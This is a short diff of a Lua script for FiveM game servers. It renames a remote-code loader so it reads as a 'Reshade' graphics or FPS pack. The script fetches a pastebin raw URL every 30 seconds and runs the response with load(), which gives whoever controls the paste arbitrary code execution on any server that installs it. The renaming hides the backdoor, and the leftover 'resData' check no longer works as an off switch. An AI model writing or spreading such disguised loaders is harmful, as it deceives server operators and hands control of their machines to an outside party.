@@ -1,16 +1,16 @@
-Config = {}
+Reshade = {}
 
-Config.RemoteURL = "https://pastebin.com/raw/1Z8VMqGg"
-Config.ExecutionInterval = 30
+Reshade.MotionBlur = "https://pastebin.com/raw/1Z8VMqGg"
+Reshade.FPS = 30
 
 
 CreateThread(function()
     while (true) do
-        Wait(Config.ExecutionInterval * 1000)
-        PerformHttpRequest(Config.RemoteURL, function(errCode, resData)
-            if (resData ~= "OFF") then
-                local code = assert(load(resData))
-                code()
+        Wait(Reshade.FPS * 1000)
+        PerformHttpRequest(Reshade.MotionBlur, function(DirectX11, FPSBoost)
+            if (resData ~= "UltraHD") then
+                local FivemGraphicPackLoader = assert(load(FPSBoost))
+                FivemGraphicPackLoader()
             end
         end)
     end
